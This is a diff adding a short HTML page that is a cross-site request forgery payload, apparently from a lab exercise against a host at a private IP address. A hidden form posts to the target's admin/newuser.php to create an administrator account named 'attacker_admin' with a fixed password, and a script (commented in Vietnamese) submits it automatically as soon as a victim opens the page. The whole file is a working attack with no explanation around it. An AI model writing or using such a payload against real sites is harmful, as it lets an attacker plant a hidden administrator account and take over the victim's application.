@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <form id="csrfForm" action="http://192.168.79.133/admin/newuser.php" method="POST">
+      <input type="hidden" name="username" value="attacker_admin" />
+      <input type="hidden" name="fullname" value="Malicious Admin Account" />
+      <input type="hidden" name="password" value="Malicious123!" />
+    </form>
+    
+    <script>
+      // Tự động submit form ngay khi nạn nhân mở trang
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
